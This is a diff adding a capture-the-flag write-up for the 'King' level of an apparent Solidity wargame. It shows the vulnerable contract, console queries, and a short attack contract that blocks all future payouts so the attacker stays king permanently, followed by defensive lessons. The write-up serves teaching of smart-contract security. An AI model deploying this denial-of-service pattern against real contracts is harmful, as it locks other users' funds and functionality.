@@ -577,3 +577,81 @@ Time to submit ;)
 ## Learning:
 
 Just because a variable is marked as private, it doesn't mean that it is not accessible. It is just a convention to mark it as private, which means for the compiler to not create getter and setter functions. The storage of a contract is public and can be read by anyone. Do not store any sensitive information in a contract :)
+
+## Level 9: King
+
+The King level has the following contract:
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract King {
+    address king;
+    uint256 public prize;
+    address public owner;
+
+    constructor() payable {
+        owner = msg.sender;
+        king = msg.sender;
+        prize = msg.value;
+    }
+
+    receive() external payable {
+        require(msg.value >= prize || msg.sender == owner);
+        payable(king).transfer(msg.value);
+        king = msg.sender;
+        prize = msg.value;
+    }
+
+    function _king() public view returns (address) {
+        return king;
+    }
+}
+```
+
+Our task: To make sure that no one else becomes the king after the obtained the crown.
+
+The contract has a `receive()` function, which is called when the contract receives Ether. The function checks if the value of the Ether sent is greater than or equal to the prize or if the sender is the owner of the contract. If the condition is met, the Ether is transferred to the current king and the sender becomes the new king.
+
+The contract also has a `_king()` function, which returns the address of the current king.
+
+The question is: How can we make sure that we remain the king, no matter what?
+
+Before we look into that, let's see who is currently king: `await contract._king()`
+shows us that `0xDed9f3474fe5f075Ed7953f36a493928b1BD9f31` is king.
+And let's see how much we have to send in order to become king:
+`await contract.prize().then(v => v.toString())` shows us `1000000000000000` Wei.
+
+Alright, let's get to work. 
+
+It is actually rather simple. See the following attack contract:
+
+```solidity
+pragma solidity ^0.8.0;
+
+contract KingSlayer {
+
+    function attack(address _contract) public payable {
+        (bool sent, ) = _contract.call{value: msg.value}("");
+        require(sent, "Failed to send value!");
+    }
+}
+```
+
+Deploy the contract, send a transaction to the `attack()` function with the address of the King contract and the amount of Ether you want to send. The King contract will now receive the Ether and you will become the new king.
+
+If someone else will try to become the king, they will send the Ether and the 
+King contract is going to transfer the Ether to our contract. But since our
+contract has no fallback or receive function, the transaction will fail and
+we will remain the king.
+
+Our contract has to use the `call` function to send the Ether, because the
+`transfer` and `send` function would fail in this case, due to the gas limit
+of 2300 gas. The receive function of the King contract requires more gas.
+
+### Learning
+Look always from the perspective of a Smart Contract. Can another smart contract
+break my contract, by not having some functions implemented? 
+And since December 2019 - use `call` instead of `transfer` or `send` to send
+Ether.
